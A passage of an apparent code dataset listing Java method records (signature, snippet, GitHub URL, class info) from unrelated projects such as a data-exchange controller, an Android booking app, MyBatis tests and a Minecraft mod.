["MultipartFile", "DataSource", "BindingResult", "HttpServletRequest", "HttpServletResponse"], "throws": null, "modifiers": ["public"], "return_type": "Response<DataSource>", "snippet": "    public Response<DataSource> update(            @RequestParam(value = \"authFile\", required = false) MultipartFile authFile,            @Validated DataSource dataSource, BindingResult result, HttpServletRequest request, HttpServletResponse resp) {        if(null != result && result.hasErrors()){            return new Response<DataSource>().errorResponse(CodeConstant.PARAMETER_ERROR, null,                    result.getFieldErrors().get(0).getDefaultMessage());        }        if(dataSource.getId()  <= 0){            return new Response<DataSource>().errorResponse(CodeConstant.PARAMETER_ERROR, null, super.informationSwitch(\"exchange.data_source.id.not.empty\"));        }        DataSource dsOld = dataSourceService.getDecryptedSimpleOne(dataSource.getId());        if(!hasDataAuth(DataSource.class, DataAuthScope.WRITE, request, dsOld)){            return new Response<DataSource>().errorResponse(CodeConstant.AUTH_ERROR, null, super.informationSwitch(\"exchange.data_source.not.access.rights\"));        }        if(!hasDataAuth(DataSource.class, DataAuthScope.ALL, request, dsOld)){           dataSource.setProjectId(dsOld.getProjectId());           //Set authScopes to null           dataSource.setAuthScopes(null);        }        File storeFile = null;        String path = null;        DataSourceConnCheck connCheck = AbstractDataSourceConnCheck.getConnCheck(dataSource.getSourceType(), resp);        if( null == connCheck){            return null;        }        security.bindUserInfo(dataSource, request);        if(!dsOld.getSourceName().equals(dataSource.getSourceName())                && StringUtils.isNotBlank(dataSource.getCreateUser())                && isDuplicate(dataSource.getSourceName(), dataSource.getCreateUser())){            return new Response<DataSource>().errorResponse(CodeConstant.PARAMETER_ERROR, null, super.informationSwitch(\"exchange.data_source.with.same.name\"));        }        if( null != dataSource.getModelId() ){            if(!modelService.exist(dataSource.getModelId())) {                return new Response<DataSource>().errorResponse(CodeConstant.PARAMETER_ERROR, null, super.informationSwitch(\"udes.datasource.invalid.datasource.id\"));            }            dataSourceService.fillDataSourceWithModel(dataSource, dataSource.getModelId());        }        try {            if (null != authFile && !authFile.isEmpty()) {                String authType = String.valueOf(dataSource.getParameterMap().get(Constants.PARAM_AUTH_TYPE));                storeFile = dataSourceService.store(authFile, authType);                path = AppUtil.getIpAndPort() + conf.getStoreUrl(authType) + storeFile.getName();            }            if (null != path) {                dataSource.setAuthCreden(path);            }            dataSource.setSourceName(StringEscapeUtils.escapeHtml3(dataSource.getSourceName()));            dataSource.setSourceDesc(dataSource.getSourceDesc());            if(StringUtils.isBlank(dataSource.getAuthCreden()) && StringUtils.isNotBlank(dataSource.getAuthEntity())){                dataSource.setAuthCreden(dsOld.getAuthCreden());            }            Long oldProjectId = dsOld.getProjectId();            if(null != oldProjectId && oldProjectId > 0 && !oldProjectId.equals(dataSource.getProjectId())){               if(jobInfoService.isRunWithDataSource(oldProjectId)){                   Project oldProject = projectService.get(oldProjectId);                   if(null != oldProject) {                       return new Response<DataSource>().errorResponse(CodeConstant.DATASOURCE_ADD_ERROR, null,                               super.informationSwitch(\"exchange.data_source.project.unbind.not\"), oldProject.getProjectName());                   }               }            }            //Validate if the parameter is json structure            Json.fromJson(dataSource.getParameter(), Map.class, String.class, Object.class);            boolean ok = getBaseService().update(dataSource);            return ok ? new Response<DataSource>().successResponse(null) :                    new Response<DataSource>().errorResponse(CodeConstant.DATASOURCE_ADD_ERROR, null, super.informationSwitch(\"exchange.data_source.add.failed\"));        } catch (Exception e) {            if (null != storeFile) {                if(!storeFile.delete()){                    LOG.error(\"IO_ERROR: delete store file Failed, Path:[\" + storeFile.getPath()+\"]\");                }            }            throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "delete", "params": ["Long", "HttpServletRequest"], "throws": null, "modifiers": ["public"], "return_type": "Response<DataSource>", "snippet": "    public Response<DataSource> delete(@PathVariable Long id, HttpServletRequest request){        if(!hasDataAuth(DataSource.class,  DataAuthScope.DELETE, request, dataSourceService.get(id))){            return new Response<DataSource>().errorResponse(CodeConstant.AUTH_ERROR, null, super.informationSwitch(\"exchange.data_source.not.access.rights\"));        }        boolean isRunWith = jobInfoService.isRunWithDataSource(id);        if(isRunWith){            return new Response<DataSource>().errorResponse(CodeConstant.DATASOURCE_EXIST_JOBS, null, super.informationSwitch(\"exchange.data_source.related.jobs\"));        }        return super.delete(id, request);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "show", "params": ["Long", "HttpServletRequest"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "Response<DataSource>", "snippet": "    public Response<DataSource> show(@PathVariable Long id,HttpServletRequest request) throws Exception {        DataSource dataSource = dataSourceService.get(id);        if(!hasDataAuth(DataSource.class, DataAuthScope.READ, request, dataSource)){            return new Response<DataSource>().errorResponse(CodeConstant.AUTH_ERROR, null, super.informationSwitch(\"exchange.data_source.not.access.rights\"));        }        return new Response<DataSource>().successResponse(dataSource);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "getPathFromReq", "params": ["HttpServletRequest", "String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String getPathFromReq(HttpServletRequest request, String prefix){        String uri = request.getRequestURI();        String path = uri.substring(uri.lastIndexOf(\"/\" + prefix) + 1);        path = path.replace(\"../\", \"/\");        path = path.replace(\"..\", \"\");        String resolvePath = conf.getStorePrefix() + IOUtils.DIR_SEPARATOR_UNIX + path;;        if(Paths.get(resolvePath).normalize()                .startsWith(Paths.get(conf.getStorePrefix()).normalize())){            return resolvePath;        }        return null;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "isDuplicate", "params": ["String", "String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isDuplicate(String dsName, String createUser){        DataSourceQuery query = new DataSourceQuery();        query.setCreateUser(createUser);        query.setSourceName(dsName);        return !dataSourceService.selectAllList(query).isEmpty();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "newInstance", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "bookings_view", "snippet": "    public static bookings_view newInstance() {        bookings_view fragment = new bookings_view();        return fragment;    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/bookings_view.java", "stars": "2", "class": {"name": "bookings_view", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        sharedPreferences=getActivity().getSharedPreferences(\"torripo_login\",Context.MODE_PRIVATE);        uname = sharedPreferences.getString(\"uname\",\"none\");    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/bookings_view.java", "stars": "2", "class": {"name": "bookings_view", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateView", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,                             Bundle savedInstanceState) {        // Inflate the layout for this fragment        if (!((MainActivity)getActivity()).isNetworkAvailable(getContext()))        {            Toast.makeText(getContext(),\"No Internet Connectivity\",Toast.LENGTH_LONG).show();            getActivity().finish();        }        View view =  inflater.inflate(R.layout.fragment_bookings_view, container, false);        tv = view.findViewById(R.id.no_booking);        pbar = view.findViewById(R.id.progress);        main_booking = view.findViewById(R.id.main_booking_view);        recyclerView = view.findViewById(R.id.booking_list);        recyclerView.setLayoutManager(new LinearLayoutManager(getActivity()));        recyclerViewAdapter = new RecyclerViewAdapter_1(getActivity(), booking_details);        recyclerView.setAdapter(recyclerViewAdapter);        Retrofit retrofit = new Retrofit.Builder().baseUrl(APIUrl.BASE_URL).                addConverterFactory(GsonConverterFactory.create()).build();        APIService service = retrofit.create(APIService.class);        Call<List<Booking_details>> call = service.get_booking_details(\"view_user_booking\",uname);        call.enqueue(new Callback<List<Booking_details>>() {            @Override            public void onResponse(Call<List<Booking_details>> call, Response<List<Booking_details>> response) {                booking_details = (ArrayList) response.body();                if (booking_details.get(0).b_id == 0 && booking_details.get(0).p_id.equalsIgnoreCase(\"error\"))                {                    pbar.setVisibility(View.INVISIBLE);                    tv.setVisibility(View.VISIBLE);                }                else {                    main_booking.setVisibility(View.VISIBLE);                    recyclerViewAdapter.setmultiplePackages(booking_details);                    recyclerViewAdapter.notifyDataSetChanged();                    pbar.setVisibility(View.INVISIBLE);                }            }            @Override            public void onFailure(Call<List<Booking_details>> call, Throwable t) {                Log.e(\"Error\", t.getMessage());            }        });        return view;    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/bookings_view.java", "stars": "2", "class": {"name": "bookings_view", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onButtonPressed", "params": ["Uri"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onButtonPressed(Uri uri) {    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/bookings_view.java", "stars": "2", "class": {"name": "bookings_view", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onAttach", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAttach(Context context) {        super.onAttach(context);    }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/bookings_view.java", "stars": "2", "class": {"name": "bookings_view", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDetach", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDetach() {        super.onDetach();        }", "url": "https://raw.githubusercontent.com/sachin2912/torripo/master/app/src/main/java/com/example/torripo/bookings_view.java", "stars": "2", "class": {"name": "bookings_view", "extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"method_name": "getActivatedTheme", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ThemeProperty", "snippet": "    public ThemeProperty getActivatedTheme() {        return null;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/service/impl/ThemeServiceImpl.java", "stars": "1", "class": {"name": "ThemeServiceImpl", "extends": null, "implements": ["ThemeService"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        ArrayList<Integer> list01 = new ArrayList<>();        list01.add(1);        list01.add(3);        list01.add(2);        System.out.println(list01);//[1, 3, 2]        //public static <T> void sort(List<T> list):\u5c06\u96c6\u5408\u4e2d\u5143\u7d20\u6309\u7167\u9ed8\u8ba4\u89c4\u5219\u6392\u5e8f\u3002        Collections.sort(list01);//\u9ed8\u8ba4\u662f\u5347\u5e8f        System.out.println(list01);//[1, 2, 3]        ArrayList<String> list02 = new ArrayList<>();        list02.add(\"a\");        list02.add(\"c\");        list02.add(\"b\");        System.out.println(list02);//[a, c, b]        Collections.sort(list02);        System.out.println(list02);//[a, b, c]        ArrayList<Person> list03 = new ArrayList<>();        list03.add(new Person(\"\u5f20\u4e09\",18));        list03.add(new Person(\"\u674e\u56db\",20));        list03.add(new Person(\"\u738b\u4e94\",15));        System.out.println(list03);//[Person{name='\u5f20\u4e09', age=18}, Person{name='\u674e\u56db', age=20}, Person{name='\u738b\u4e94', age=15}]        Collections.sort(list03);        System.out.println(list03);    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/14.%E3%80%90List%E3%80%81Set%E3%80%91-%E7%AC%94%E8%AE%B0/code/03_ListAndSet/src/com/itheima/demo05/Collections/Demo02Sort(1).java", "stars": "2", "class": {"name": "Demo02Sort", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dispose", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dispose() {        if(this.isDisposed()) return;        this.isDisposed = true;        this.removeAllServers();    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/communication/CommunicationManager.java", "stars": "2", "class": {"name": "CommunicationManager", "extends": null, "implements": ["ICommunicationManager"], "modifiers": ["public"]}}, {"method_name": "addServer", "params": ["IServer"], "throws": null, "modifiers": ["public"], "return_type": "IServer", "snippet": "    public IServer addServer(IServer server) {        if(server == null) return null;        if(this.servers.containsValue(server)) return server;        server.setContainer(this);        if(this.nitroCore != null) {            server.setEventDispatcher(this.nitroCore.getPluginManager().getEventDispatcher());            ServerAddedEvent event = this.nitroCore.getPluginManager().dispatchEvent(new ServerAddedEvent(server));            if(event.isCancelled()) return null;        }        this.servers.put(server.getId(), server);        return server;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/communication/CommunicationManager.java", "stars": "2", "class": {"name": "CommunicationManager", "extends": null, "implements": ["ICommunicationManager"], "modifiers": ["public"]}}, {"method_name": "removeServer", "params": ["IServer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeServer(IServer server) {        if(server == null) return;        if(this.nitroCore != null) {            ServerRemovedEvent event = this.nitroCore.getPluginManager().dispatchEvent(new ServerRemovedEvent(server));            if(event.isCancelled()) return;        }        IServer existing = this.servers.remove(server.getId());        if(existing != null) existing.dispose();    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/communication/CommunicationManager.java", "stars": "2", "class": {"name": "CommunicationManager", "extends": null, "implements": ["ICommunicationManager"], "modifiers": ["public"]}}, {"method_name": "removeAllServers", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeAllServers() {        if((this.servers == null) || (this.servers.size() < 1)) return;        for(IServer server : this.servers.values()) this.removeServer(server);    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/communication/CommunicationManager.java", "stars": "2", "class": {"name": "CommunicationManager", "extends": null, "implements": ["ICommunicationManager"], "modifiers": ["public"]}}, {"method_name": "isDisposed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDisposed() {        return this.isDisposed;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/communication/CommunicationManager.java", "stars": "2", "class": {"name": "CommunicationManager", "extends": null, "implements": ["ICommunicationManager"], "modifiers": ["public"]}}, {"method_name": "getNitroCore", "params": [], "throws": null, "modifiers": ["public"], "return_type": "INitroCore", "snippet": "    public INitroCore getNitroCore() {        return this.nitroCore;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/communication/CommunicationManager.java", "stars": "2", "class": {"name": "CommunicationManager", "extends": null, "implements": ["ICommunicationManager"], "modifiers": ["public"]}}, {"method_name": "getServers", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<Integer,IServer>", "snippet": "    public Map<Integer, IServer> getServers() {        return this.servers;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/communication/CommunicationManager.java", "stars": "2", "class": {"name": "CommunicationManager", "extends": null, "implements": ["ICommunicationManager"], "modifiers": ["public"]}}, {"method_name": "put", "params": ["String", "DataSource"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void put(String dataSourceName, DataSource dataSource) {        this.dataSourceMap.put(dataSourceName, dataSource);    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/session/DynamicDataSource.java", "stars": "13", "class": {"name": "DynamicDataSource", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDataSource", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "DataSource", "snippet": "    public DataSource getDataSource(String dataSourceName) {        DataSource dataSource = dataSourceMap.get(dataSourceName);        Assert.isNotNull(dataSource, String.format(\"\u627e\u4e0d\u5230\u6570\u636e\u6e90%s\", dataSourceName));        return dataSource;    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/session/DynamicDataSource.java", "stars": "13", "class": {"name": "DynamicDataSource", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    // create an SqlSessionFactory    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/uuid_test/mybatis-config.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    // populate in-memory database    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/uuid_test/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/uuid_test/UUIDTest.java", "stars": "15", "class": {"name": "UUIDTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldGetAUser", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUser() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      Assertions.assertThrows(PersistenceException.class, () -> mapper.getUser(UUID.fromString(\"38400000-8cf0-11bd-b23e-10b96e4ef00d\")));    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/uuid_test/UUIDTest.java", "stars": "15", "class": {"name": "UUIDTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldInsertAUser", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldInsertAUser() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      User user = new User();      user.setId(UUID.randomUUID());      user.setName(\"User2\");      mapper.insertUser(user);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/uuid_test/UUIDTest.java", "stars": "15", "class": {"name": "UUIDTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCode() {        return code;    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setCode", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCode(Integer code) {        this.code = code;    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getMsg", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMsg() {        return msg;    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setMsg", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMsg(String msg) {        this.msg = msg;    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object getData() {        return data;    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setData", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(Object data) {        this.data = data;    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "buildSuccess", "params": ["int", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "JsonData", "snippet": "    public static JsonData buildSuccess(int code,String msg){        return new JsonData(code,msg);    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "buildSuccess", "params": ["int", "String", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "JsonData", "snippet": "    public static JsonData buildSuccess(int code,String msg,Object obj){        return new JsonData(code,msg,obj);    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "buildSuccess", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "JsonData", "snippet": "    public static JsonData buildSuccess(){        return new JsonData(200,\"\u8bf7\u6c42\u6210\u529f\");    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "buildSuccess", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "JsonData", "snippet": "    public static JsonData buildSuccess(Object obj){        return new JsonData(200,\"\u8bf7\u6c42\u6210\u529f\",obj);    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/enums/JsonData.java", "stars": "2", "class": {"name": "JsonData", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getInstance", "params": [], "throws": null, "modifiers": ["synchronized", "public", "static"], "return_type": "RegisterCC", "snippet": "    public static synchronized RegisterCC getInstance() {        if (instance == null) {            instance = new RegisterCC();        }        return instance;    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/RegisterCC.java", "stars": "4", "class": {"name": "RegisterCC", "extends": "Register", "implements": null, "modifiers": ["public"]}}, {"method_name": "findByCriteria", "params": ["LeasingCriteria"], "throws": null, "modifiers": ["public"], "return_type": "List<LeasingDTO>", "snippet": "    public List<LeasingDTO> findByCriteria(LeasingCriteria criteria) {        log.debug(\"find by criteria : {}\", criteria);        final Specification<Leasing> specification = createSpecification(criteria);        return (leasingRepository.findAll(specification)).stream()            .map(leasingMapper::toDto).collect(Collectors.toList());    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/LeasingQueryService.java", "stars": "2", "class": {"name": "LeasingQueryService", "extends": "QueryService", "implements": null, "modifiers": ["public"]}}, {"method_name": "findByCriteria", "params": ["LeasingCriteria", "Pageable"], "throws": null, "modifiers": ["public"], "return_type": "Page<LeasingDTO>", "snippet": "    public Page<LeasingDTO> findByCriteria(LeasingCriteria criteria, Pageable page) {        log.debug(\"find by criteria : {}, page: {}\", criteria, page);        final Specification<Leasing> specification = createSpecification(criteria);        return leasingRepository.findAll(specification, page)            .map(leasingMapper::toDto);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/LeasingQueryService.java", "stars": "2", "class": {"name": "LeasingQueryService", "extends": "QueryService", "implements": null, "modifiers": ["public"]}}, {"method_name": "createSpecification", "params": ["LeasingCriteria"], "throws": null, "modifiers": ["private"], "return_type": "Specification<Leasing>", "snippet": "    private Specification<Leasing> createSpecification(LeasingCriteria criteria) {        Specification<Leasing> specification = Specification.where(null);        if (criteria != null) {            if (criteria.getId() != null) {                specification = specification.and(buildSpecification(criteria.getId(), Leasing_.id));            }            if (criteria.getFrom() != null) {                specification = specification.and(buildRangeSpecification(criteria.getFrom(), Leasing_.from));            }            if (criteria.getTo() != null) {                specification = specification.and(buildRangeSpecification(criteria.getTo(), Leasing_.to));            }            if (criteria.getStatus() != null) {                specification = specification.and(buildSpecification(criteria.getStatus(), Leasing_.status));            }            if (criteria.getMessageId() != null) {                specification = specification.and(buildSpecification(criteria.getMessageId(),                    root -> root.join(Leasing_.messages, JoinType.LEFT).get(Message_.id)));            }        }        return specification;    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/LeasingQueryService.java", "stars": "2", "class": {"name": "LeasingQueryService", "extends": "QueryService", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMappings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<StubMapping>", "snippet": "  public List<StubMapping> getMappings() {    return mappings;  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/mapping/MappingCollection.java", "stars": "8", "class": {"name": "MappingCollection", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMappings", "params": ["List<StubMapping>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setMappings(List<StubMapping> mappings) {    this.mappings = mappings;  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/mapping/MappingCollection.java", "stars": "8", "class": {"name": "MappingCollection", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "initElements", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\t\telements.blocks.add(() -> new CustomBlock());\t\telements.items\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/JungleParquetStairsBlock.java", "stars": "2", "class": {"name": "JungleParquetStairsBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDrops", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\t\t\tif (!dropsOriginal.isEmpty())\t\t\t\treturn dropsOriginal;\t\t\treturn Collections.singletonList(new ItemStack(this, 1));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/JungleParquetStairsBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "StairsBlock", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getMachineIp", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getMachineIp() {        InetAddress machineAddress;        try {            machineAddress = InetAddress.getLocalHost();        } catch (UnknownHostException e) {            machineAddress = InetAddress.getLoopbackAddress();        }        return machineAddress.getHostAddress();    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/util/IpUtil.java", "stars": "1", "class": {"name": "IpUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeProcedure", "params": ["java"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void executeProcedure(java.util.HashMap<String, Object> dependencies) {\t\tif (dependencies.get(\"x\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency x for procedure SunflowerExplosion!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"y\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency y for procedure SunflowerExplosion!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"z\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency z for procedure SunflowerExplosion!\");\t\t\treturn;\t\t}\t\tif (dependencies.get(\"world\") == null) {\t\t\tSystem.err.println(\"Failed to load dependency world for procedure SunflowerExplosion!\");\t\t\treturn;\t\t}\t\tint x = (int) dependencies.get(\"x\");\t\tint y = (int) dependencies.get(\"y\");\t\tint z = (int) dependencies.get(\"z\");\t\tWorld world = (World) dependencies.get(\"world\");\t\tif (!world.isRemote) {\t\t\tItemEntity 